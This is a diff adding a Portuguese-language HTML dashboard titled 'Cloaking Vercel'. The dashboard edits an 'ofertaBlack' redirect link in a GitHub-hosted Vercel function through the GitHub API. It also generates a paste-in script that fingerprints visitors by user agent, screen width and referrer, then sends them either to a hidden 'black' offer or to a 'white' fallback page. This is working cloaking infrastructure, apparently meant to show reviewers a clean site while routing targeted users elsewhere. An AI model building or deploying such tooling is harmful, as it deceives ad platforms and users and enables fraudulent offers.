@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="pt-BR" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gerenciador - Cloaking Vercel</title>
+    <style>
+        :root {
+            --bg-color: #0f172a;
+            --surface-color: #1e293b;
+            --border-color: #334155;
+            --text-primary: #f8fafc;
+            --text-secondary: #94a3b8;
+            --accent-color: #3b82f6;
+            --accent-hover: #2563eb;
+            --success-color: #10b981;
+            --error-color: #ef4444;
+            --glass-bg: rgba(30, 41, 59, 0.7);
+            --glass-border: rgba(255, 255, 255, 0.1);
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-primary);
+            line-height: 1.5;
+            min-height: 100vh;
+            display: flex;
+            background-image: 
+                radial-gradient(at 0% 0%, rgba(59, 130, 246, 0.15) 0px, transparent 50%),
+                radial-gradient(at 100% 100%, rgba(16, 185, 129, 0.15) 0px, transparent 50%);
+            background-attachment: fixed;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 1000px;
+            margin: 2rem auto;
+            padding: 0 1rem;
+            display: grid;
+            grid-template-columns: 260px 1fr;
+            gap: 2rem;
+            align-items: start;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Sidebar */
+        .sidebar {
+            background: var(--glass-bg);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid var(--glass-border);
+            border-radius: 16px;
+            padding: 1.5rem 1rem;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
+        }
+
+        .sidebar-title {
+            font-size: 1.25rem;
+            font-weight: 700;
+            margin-bottom: 2rem;
+            padding-left: 0.5rem;
+            background: linear-gradient(135deg, #60a5fa, #a78bfa);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .nav-item {
+            display: block;
+            width: 100%;
+            text-align: left;
+            padding: 0.875rem 1rem;
+            background: transparent;
+            border: none;
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+            font-weight: 500;
+            cursor: pointer;
+            border-radius: 8px;
+            transition: all 0.2s ease;
+            margin-bottom: 0.5rem;
+        }
+
+        .nav-item:hover {
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--text-primary);
+        }
+
+        .nav-item.active {
+            background: var(--accent-color);
+            color: white;
+            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
+        }
+
+        /* Main Content */
+        .main-content {
+            background: var(--glass-bg);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid var(--glass-border);
+            border-radius: 16px;
+            padding: 2.5rem;
+            min-height: 500px;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
+        }
+
+        .tab-content {
+            display: none;
+            animation: fadeIn 0.4s ease-out forwards;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h2 {
+            font-size: 1.75rem;
+            font-weight: 600;
+            margin-bottom: 2rem;
+            color: var(--text-primary);
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-size: 0.875rem;
+            font-weight: 500;
+            color: var(--text-secondary);
+        }
+
+        input[type="text"],
+        input[type="password"],
+        input[type="url"] {
+            width: 100%;
+            padding: 0.875rem 1rem;
+            background: rgba(0, 0, 0, 0.25);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-primary);
+            font-family: inherit;
+            font-size: 0.95rem;
+            transition: all 0.2s ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--accent-color);
+            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2);
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0.875rem 1.75rem;
+            background: var(--accent-color);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .btn:hover:not(:disabled) {
+            background: var(--accent-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(59, 130, 246, 0.3);
+        }
+
+        .btn:active:not(:disabled) {
+            transform: translateY(0);
+        }
+        
+        .btn-outline {
+            background: transparent;
+            border: 1px solid var(--border-color);
+            color: var(--text-primary);
+            box-shadow: none;
+        }
+        
+        .btn-outline:hover:not(:disabled) {
+            background: rgba(255, 255, 255, 0.05);
+            border-color: var(--text-secondary);
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .alert {
+            padding: 1rem 1.25rem;
+            border-radius: 8px;
+            margin-bottom: 2rem;
+            font-size: 0.95rem;
+            display: none;
+            align-items: center;
+            gap: 0.5rem;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .alert.success {
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid rgba(16, 185, 129, 0.2);
+            color: #34d399;
+            display: flex;
+        }
+
+        .alert.error {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+            color: #f87171;
+            display: flex;
+        }
+
+        .code-block {
+            position: relative;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 8px;
+            padding: 1.5rem;
+            overflow-x: auto;
+            border: 1px solid var(--border-color);
+            margin-bottom: 1.5rem;
+        }
+
+        pre {
+            margin: 0;
+            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+            font-size: 0.875rem;
+            color: #e2e8f0;
+            line-height: 1.6;
+        }
+
+        .status-text {
+            font-size: 0.9rem;
+            margin-top: 1rem;
+            color: var(--text-secondary);
+            min-height: 1.5rem;
+            font-weight: 500;
+        }
+        
+        .current-link-display {
+            background: rgba(0,0,0,0.25);
+            padding: 1.5rem;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            margin-bottom: 2rem;
+            word-break: break-all;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .current-link-display::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 4px; height: 100%;
+            background: var(--accent-color);
+        }
+        
+        .current-link-label {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            color: var(--text-secondary);
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+        }
+        
+        .current-link-value {
+            font-size: 1.15rem;
+            font-weight: 500;
+            color: var(--text-primary);
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <aside class="sidebar">
+        <div class="sidebar-title">Dashboard</div>
+        <nav>
+            <button class="nav-item active" onclick="switchTab('config')">Configuração</button>
+            <button class="nav-item" onclick="switchTab('mobile')">Link Mobile</button>
+            <button class="nav-item" onclick="switchTab('script')">Gerar Script</button>
+        </nav>
+    </aside>
+
+    <main class="main-content">
+        <!-- TAB CONFIGURAÇÃO -->
+        <div id="tab-config" class="tab-content active">
+            <h2>Configurações da API</h2>
+            <div id="config-msg" class="alert"></div>
+            
+            <form id="configForm" onsubmit="saveConfig(event)">
+                <div class="form-group">
+                    <label for="ghToken">GitHub Personal Access Token</label>
+                    <input type="password" id="ghToken" required placeholder="ghp_xxxxxxxxxxxxxxxxxxxx">
+                </div>
+                
+                <div class="form-group">
+                    <label for="ghRepo">Repositório</label>
+                    <input type="text" id="ghRepo" required placeholder="usuario/repositorio">
+                </div>
+                
+                <div class="form-group">
+                    <label for="ghBranch">Branch</label>
+                    <input type="text" id="ghBranch" required value="main">
+                </div>
+                
+                <div class="form-group">
+                    <label for="ghPath">Caminho do arquivo</label>
+                    <input type="text" id="ghPath" required value="api/filtrar.mjs">
+                </div>
+                
+                <div class="form-group">
+                    <label for="vercelUrl">URL Base da Vercel</label>
+                    <input type="url" id="vercelUrl" required placeholder="https://meu-projeto.vercel.app">
+                </div>
+                
+                <button type="submit" class="btn">Salvar no LocalStorage</button>
+            </form>
+        </div>
+
+        <!-- TAB LINK MOBILE -->
+        <div id="tab-mobile" class="tab-content">
+            <h2>Atualizar Link Mobile</h2>
+            <div id="mobile-msg" class="alert"></div>
+            
+            <div class="current-link-display">
+                <div class="current-link-label">Link Atual (ofertaBlack)</div>
+                <div class="current-link-value" id="currentLinkValue">Desconhecido. Clique em "Ler arquivo atual".</div>
+            </div>
+
+            <div class="form-group">
+                <button type="button" class="btn btn-outline" onclick="readCurrentFile()" id="btnRead">Ler arquivo atual</button>
+            </div>
+            
+            <hr style="border: 0; border-top: 1px solid var(--border-color); margin: 2rem 0;">
+
+            <div class="form-group">
+                <label for="newMobileLink">Novo Link Mobile (Destino)</label>
+                <input type="url" id="newMobileLink" placeholder="https://nova-oferta.com/">
+            </div>
+            
+            <button type="button" class="btn" onclick="saveAndDeploy()" id="btnDeploy">Salvar e fazer deploy</button>
+            
+            <div class="status-text" id="deployStatus"></div>
+        </div>
+
+        <!-- TAB SCRIPT -->
+        <div id="tab-script" class="tab-content">
+            <h2>Script de Integração</h2>
+            <div id="script-msg" class="alert"></div>
+            <p style="color: var(--text-secondary); margin-bottom: 2rem; font-size: 0.95rem;">
+                Configure a URL de fallback se desejar, e copie o script abaixo para colar dentro do <code>&lt;head&gt;</code> ou no final do <code>&lt;body&gt;</code> do seu site de origem.
+            </p>
+
+            <div class="form-group">
+                <label for="whiteUrl">URL White (Fallback Desktop) - Opcional</label>
+                <input type="url" id="whiteUrl" placeholder="https://meusite-seguro.com/" oninput="generateScript()">
+            </div>
+            
+            <div class="code-block">
+                <pre id="scriptOutput">// Configure e salve a aba 'Configuração' primeiro.</pre>
+            </div>
+            
+            <button type="button" class="btn" onclick="copyScript()">Copiar Script</button>
+        </div>
+    </main>
+</div>
+
+<script>
+    let fileSha = null;
+    let fileContentDecoded = null;
+
+    document.addEventListener('DOMContentLoaded', () => {
+        loadConfig();
+    });
+
+    function switchTab(tabId) {
+        document.querySelectorAll('.nav-item').forEach(btn => btn.classList.remove('active'));
+        document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+        
+        document.querySelector(`.nav-item[onclick="switchTab('${tabId}')"]`).classList.add('active');
+        document.getElementById(`tab-${tabId}`).classList.add('active');
+        
+        hideAllMessages();
+
+        if (tabId === 'script') {
+            generateScript();
+        }
+    }
+
+    function showMessage(id, message, type) {
+        const el = document.getElementById(id);
+        el.className = `alert ${type}`;
+        el.innerHTML = message;
+        el.style.display = 'flex';
+    }
+
+    function hideAllMessages() {
+        document.querySelectorAll('.alert').forEach(el => el.style.display = 'none');
+    }
+
+    function updateDeployStatus(msg, isError = false) {
+        const el = document.getElementById('deployStatus');
+        el.textContent = msg;
+        el.style.color = isError ? 'var(--error-color)' : 'var(--text-secondary)';
+    }
+
+    function loadConfig() {
+        const keys = ['ghToken', 'ghRepo', 'ghBranch', 'ghPath', 'vercelUrl'];
+        keys.forEach(key => {
+            const val = localStorage.getItem(key);
+            if (val) {
+                document.getElementById(key).value = val;
+            }
+        });
+    }
+
+    function saveConfig(e) {
+        e.preventDefault();
+        const keys = ['ghToken', 'ghRepo', 'ghBranch', 'ghPath', 'vercelUrl'];
+        keys.forEach(key => {
+            localStorage.setItem(key, document.getElementById(key).value.trim());
+        });
+        showMessage('config-msg', 'Configurações salvas no localStorage!', 'success');
+        setTimeout(() => hideAllMessages(), 3000);
+    }
+
+    function getApiHeaders() {
+        const token = localStorage.getItem('ghToken');
+        if (!token) throw new Error('GitHub Token não configurado.');
+        
+        return {
+            'Authorization': `Bearer ${token}`,
+            'Accept': 'application/vnd.github+json',
+            'X-GitHub-Api-Version': '2022-11-28',
+            'Content-Type': 'application/json'
+        };
+    }
+
+    function getApiUrl() {
+        const repo = localStorage.getItem('ghRepo');
+        const path = localStorage.getItem('ghPath');
+        if (!repo || !path) throw new Error('Repositório ou Caminho não configurados.');
+        return `https://api.github.com/repos/${repo}/contents/${path}`;
+    }
+
+    // Funções de base64 solicitadas para manter codificação original
+    function decodeBase64(b64) {
+        return decodeURIComponent(escape(atob(b64)));
+    }
+
+    function encodeBase64(str) {
+        return btoa(unescape(encodeURIComponent(str)));
+    }
+
+    async function readCurrentFile() {
+        hideAllMessages();
+        const btn = document.getElementById('btnRead');
+        const prevText = btn.textContent;
+        btn.textContent = 'Buscando...';
+        btn.disabled = true;
+        updateDeployStatus('');
+
+        try {
+            const branch = localStorage.getItem('ghBranch') || 'main';
+            const url = `${getApiUrl()}?ref=${branch}`;
+            
+            const res = await fetch(url, { headers: getApiHeaders() });
+            
+            if (!res.ok) {
+                const errData = await res.json().catch(()=>({}));
+                throw new Error(errData.message || `Erro HTTP: ${res.status}`);
+            }
+
+            const data = await res.json();
+            fileSha = data.sha;
+            fileContentDecoded = decodeBase64(data.content);
+            
+            // Regex que captura ofertaBlack ou jsofertaBlack com aspas simples ou duplas
+            const regex = /(ofertaBlack:\s*['"])([^'"]+)(['"])/;
+            const match = fileContentDecoded.match(regex);
+            
+            if (match && match[2]) {
+                const currentLink = match[2];
+                document.getElementById('currentLinkValue').textContent = currentLink;
+                showMessage('mobile-msg', 'Arquivo lido com sucesso!', 'success');
+            } else {
+                document.getElementById('currentLinkValue').textContent = 'Não encontrado no arquivo.';
+                throw new Error("A variável 'ofertaBlack' não foi encontrada usando a regex esperada.");
+            }
+
+        } catch (error) {
+            console.error(error);
+            showMessage('mobile-msg', error.message, 'error');
+        } finally {
+            btn.textContent = prevText;
+            btn.disabled = false;
+        }
+    }
+
+    async function saveAndDeploy() {
+        const novoLink = document.getElementById('newMobileLink').value.trim();
+        if (!novoLink) {
+            showMessage('mobile-msg', 'Por favor, digite o novo link.', 'error');
+            return;
+        }
+
+        const btn = document.getElementById('btnDeploy');
+        btn.disabled = true;
+        hideAllMessages();
+        
+        try {
+            updateDeployStatus('Buscando arquivo atualizado...');
+            
+            const branch = localStorage.getItem('ghBranch') || 'main';
+            const url = getApiUrl();
+            
+            // Fetch mais recente para evitar conflito de SHA
+            const resGet = await fetch(`${url}?ref=${branch}`, { headers: getApiHeaders() });
+            if (!resGet.ok) throw new Error('Falha ao ler o arquivo no repositório.');
+            const dataGet = await resGet.json();
+            
+            fileSha = dataGet.sha;
+            fileContentDecoded = decodeBase64(dataGet.content);
+
+            updateDeployStatus('Fazendo commit...');
+            
+            const regex = /(ofertaBlack:\s*['"])([^'"]+)(['"])/;
+            if (!regex.test(fileContentDecoded)) {
+                throw new Error('A variável "ofertaBlack" não pôde ser localizada no código atual.');
+            }
+
+            const newContent = fileContentDecoded.replace(regex, `$1${novoLink}$3`);
+            const newContentBase64 = encodeBase64(newContent);
+            
+            const putBody = {
+                message: `Update ofertaBlack to ${novoLink}`,
+                content: newContentBase64,
+                sha: fileSha,
+                branch: branch
+            };
+
+            const resPut = await fetch(url, {
+                method: 'PUT',
+                headers: getApiHeaders(),
+                body: JSON.stringify(putBody)
+            });
+
+            if (!resPut.ok) {
+                const errData = await resPut.json().catch(()=>({}));
+                throw new Error(errData.message || `Erro HTTP: ${resPut.status} ao salvar.`);
+            }
+
+            document.getElementById('currentLinkValue').textContent = novoLink;
+            document.getElementById('newMobileLink').value = '';
+            
+            showMessage('mobile-msg', 'Atualizado com sucesso!', 'success');
+            updateDeployStatus('Deploy iniciado! Aguarde ~30s para refletir online.');
+            
+        } catch (error) {
+            console.error(error);
+            showMessage('mobile-msg', error.message, 'error');
+            updateDeployStatus('Falha na atualização.', true);
+        } finally {
+            btn.disabled = false;
+        }
+    }
+
+    function generateScript() {
+        const vercelUrl = localStorage.getItem('vercelUrl');
+        const apiPath = localStorage.getItem('ghPath');
+        
+        if (!vercelUrl || !apiPath) {
+            document.getElementById('scriptOutput').textContent = '// Preencha e salve a URL da Vercel e o Caminho na aba "Configuração".';
+            return;
+        }
+
+        const cleanVercelUrl = vercelUrl.replace(/\/+$/, '');
+        const endpointPath = apiPath.replace(/\.m?js$/, '');
+        const endpoint = `${cleanVercelUrl}/${endpointPath}`;
+        const whiteUrl = document.getElementById('whiteUrl').value.trim();
+
+        const scriptStr = `<script>
+(function() {
+  const endpoint = "${endpoint}";
+  const whiteUrl = "${whiteUrl}";
+  
+  fetch(endpoint, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      screenWidth: window.screen.width,
+      referrer: document.referrer
+    })
+  })
+  .then(res => res.json())
+  .then(data => {
+    if (data.action === 'redirect' && data.url) {
+      window.location.href = data.url;
+    } else if (whiteUrl) {
+      window.location.href = whiteUrl;
+    }
+  })
+  .catch(err => console.error('Cloak Error:', err));
+})();
+<\/script>`;
+
+        document.getElementById('scriptOutput').textContent = scriptStr;
+    }
+
+    function copyScript() {
+        const code = document.getElementById('scriptOutput').textContent;
+        if (code.includes('// Preencha e salve')) return;
+
+        navigator.clipboard.writeText(code).then(() => {
+            showMessage('script-msg', 'Script copiado!', 'success');
+            setTimeout(() => hideAllMessages(), 3000);
+        }).catch(err => {
+            console.error('Falha ao copiar:', err);
+            showMessage('script-msg', 'Erro ao copiar.', 'error');
+        });
+    }
+</script>
+
+</body>
+</html>
